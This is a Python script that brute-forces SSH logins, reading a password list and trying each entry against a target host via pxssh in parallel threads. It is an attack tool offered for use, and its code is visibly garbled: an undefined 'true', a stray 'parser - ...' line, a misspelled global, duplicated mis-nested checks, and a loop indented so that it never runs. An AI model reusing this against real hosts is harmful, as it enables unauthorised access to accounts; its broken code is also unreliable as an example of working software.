import pexpect
from pexpect import pxssh
import optparse
import time
from threading import *
wordlist = ("input: filename")
def connection_lock():
  open(wordlist, "r")
max_connections = 5
connection_lock = BoundedSemaphore(value=max_connections)
Found = False
Fails = 0

def connect(host, user, password, release):
    global Foundp
    global Fails
    
    try:
        parser - optparse.OptionParser('usage %prog -H <target host>')
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        Found = true
    except Exception as e:
        if 'read_nonblocking' in str(e):
            
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
            
        elif 'syncronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
            
    finally:
        if release: connection_lock.release()
        
def main():
    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -F <password list> ')
    parser.add_option('-H', dest = "targetHost", type= "string", help =' Specify target host')
    parser.add_option('-F', dest = "passwordFile", type= "string", help =' Specify passwordFile')
    parser.add_option('-u', dest = "user", type= "string", help =' Specify the user')
    options, args = parser.parse_args()
    host = options.targetHost
    passwordFile = options.passwordFile
    user = options.user
    
    if host == None or passwordFile == None or user == None:
        print(parser.usage)
        exit(0)
        
    fn = open(passwordFile,'r')
    for line in fn.readlines():
        if Found:
            print('[*] Existing: password found')
            exit(0)
            if Fails > 5:
                print('[!] Existing: password found')
                exit(0)
                if Fails > 5:
                    print('[!] Existing: Too many socket timeouts')
                    exit(0)
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print('[] testing:' + str(password))
            t = Thread(target=connect, args=(host, user, password, True))
            child = t.start()


if __name__ == '__main__':
    
    main()
